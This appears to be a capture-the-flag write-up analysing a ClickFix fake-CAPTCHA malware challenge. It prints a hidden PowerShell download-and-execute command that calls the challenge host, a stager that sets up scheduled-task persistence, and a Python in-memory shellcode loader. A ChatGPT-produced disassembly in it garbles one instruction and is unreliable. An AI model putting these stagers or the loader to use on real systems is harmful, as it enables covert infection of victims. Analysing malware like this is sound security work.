---
title: "Verify You Are Human"
date: 2025-11-26
categories:
  - Huntress
tags:
  - Malware
  - "2025"
platform: Huntress 2025
competition_year: "2025"
toc: true
toc_sticky: true
---

# 🐞 Verify You Are Human

|Category         |	Author                |
|-----------------|-----------------------|
|🐞 Malware       |John Hammond           |

## Challenge Prompt

My computer said I needed to update MS Teams, so that is what I have been trying to do...

...but I can't seem to get past this CAPTCHA!

> [!CAUTION]
> This is the `Malware` category, and as such, includes malware.
> Please be sure to analyze these files within an isolated virtual machine.

> [!NOTE]
> Some components of this challenge may be finicky with the browser-based connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.
> >(i.e., "remove the port" when you need to... you'll know what I mean 😜)

## Problem Type
- Clickfix
- PowerShell Malware
- Python Malware


## Solve
Click the CAPTCHA<br>
It loads a new page and you now have code in your clipboard<br>
Paste to a txt doc
```powershell
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://52daaa57.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

See the next hop to `/?tic=1`, navigate there and grab the code:
```powershell
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://52daaa57.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

Review this code and notice next hop is `/?tic=2`
It is also running a decompression function on the PDF, so it is really a ZIP file.

Download the file from /?tic=2<br>
Use 7zip to extract (`7z e document.pdf`)

Review file Output.py
```python
import base64

exec(base64.b64decode('aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp').decode('utf-8'))
```

This has Base64 encoded text.<br>
Copy to Cyber Chef and decode from Base64:
```python
import ctypes 

def xor_decrypt(ciphertext_bytes, key_bytes): 
	decrypted_bytes = bytearray() 
	key_length = len(key_bytes) 
	
	for i, byte in enumerate(ciphertext_bytes): 
		decrypted_byte = byte ^ key_bytes[i % key_length]
		decrypted_bytes.append(decrypted_byte) 
		return bytes(decrypted_bytes) 

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='))) 

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) 

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 

functype = ctypes.CFUNCTYPE(ctypes.c_void_p) 
fn = functype(ptr) 
fn()
```

Copy the `import` `def xor_decrypt` and the `shellcode =` lines and paste to a .py file<br>
Add `import base64` to the first line<br>
Add `print(shellcode)` to the last line<br>
Run the script<br>
Python3 script.py > out.txt:
```python
bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
```

Paste shellcode to chatGPT and ask it to disassemble in x86
```
0x1000: 55                      push   ebp
0x1001: 89 e5                   mov    ebp,esp
0x1003: 81 ec 80 00 00 00       sub    esp,0x80          ; allocate 0x80 bytes stack frame
0x1009: 68 93 d8 84 84          push   0x8484d893        ; immediate push (likely pointer/data)
0x100e: 68 90 c3 c6 97          push   0x97c6c390
0x1013: 68 c3 90 93 92          push   0x929390c3
0x1018: 68 90 c4 c3 c7          push   0xc7c3c490
0x101d: 68 9c 93 9c 93          push   0x939c939c
0x1022: 68 c0 9c c6 c6          push   0xc6c69cc0
0x1027: 68 97 c6 9c 93          push   0x939cc697
0x102c: 68 94 c7 9d c1          push   0xc19dc794
0x1031: 68 de c1 96 91          push   0x9196c1de
0x1036: 68 c3 c9 c4 c2          push   0xc2c4c9c3
0x103b: b9 0a 00 00 00          mov    ecx,0xa
0x1040: 89 e7                   mov    edi,esp
0x1042: 81 37 a5 a5 a5 a5       xchg   DWORD PTR [edi],esp  ; (0x81 37 is actually cmp? see note)
                                       ; **Note**: 0x81 /7 with modrm 0x37 is "xor" family depending on opcode; this encoding is odd here.
                                       ; Best interpretation: opcode 81 37 imm32 => xchg or cmp? (uncertain)
0x1048: 83 c7 04                add    edi,0x4
0x104b: 49                      dec    ecx
0x104c: 75 f4                   jne    0x1042            ; loop back if not zero (f4 is negative displacement -12)
0x104e: c6 44 24 26 00          mov    BYTE PTR [esp+0x26],0x0
0x1053: c6 85 7f ff ff ff 00    mov    BYTE PTR [ebp-0x81],0x0
0x105a: 89 e6                   mov    esi,esp
0x105c: 8d 7d 80                lea    edi,[ebp-0x80]
0x105f: b9 26 00 00 00          mov    ecx,0x26
0x1064: 8a 06                   mov    al,BYTE PTR [esi]
0x1066: 88 07                   mov    BYTE PTR [edi],al
0x1068: 46                      inc    esi
0x1069: 47                      inc    edi
0x106a: 49                      dec    ecx
0x106b: 75 f7                   jne    0x1064
0x106d: c6 07 00                mov    BYTE PTR [edi],0x0
0x1070: 8d 3c 24                lea    edi,[esp]          ; lea edi, [esp]
0x1073: b9 40 00 00 00          mov    ecx,0x40
0x1078: b0 01                   mov    al,0x1
0x107a: 88 07                   mov    BYTE PTR [edi],al
0x107c: 47                      inc    edi
0x107d: 49                      dec    ecx
0x107e: 75 fa                   jne    0x107a
0x1080: c9                      leave
0x1081: c3                      ret
```

Ask it to run the `push imm32` values and `xor` with the `A5`:

| Original       | XOR'd          | ASCII        |
| -------------- | -------------- | ------------ |
| 0x8484d893     | 0x21217d36     | `6}!!`       |
| 0x97c6c390     | 0x32636635     | `5fc2`       |
| 0x929390c3     | 0x37363566     | `f567`       |
| 0xc7c3c490     | 0x62666135     | `5afb`       |
| 0x939c939c     | 0x36393639     | `9696`       |
| 0xc6c69cc0     | 0x63633965     | `e9cc`       |
| 0x939cc697     | 0x36396332     | `2c96`       |
| 0xc19dc794     | 0x64386231     | `1b8d`       |
| 0x9196c1de     | 0x3433647b     | `{d34`       |
| **0xc2c4c9c3** | **0x67616c66** | **`flag`** ✅ |


Beacuse it is 32 bit, it needs reversed.

---
Saw this tool being used by someone else:

Floss tool for shellcode
`./floss --format sc32 shellcode.bin (for 32 bit)`
`./floss --format sc64 shellcode.bin (for 64 bit)`

## Flag
`flag{d341b8d2c96e9cc96965afbf5675fc26}`


<p align="right">(<a href="#top">back to top</a>)</p>
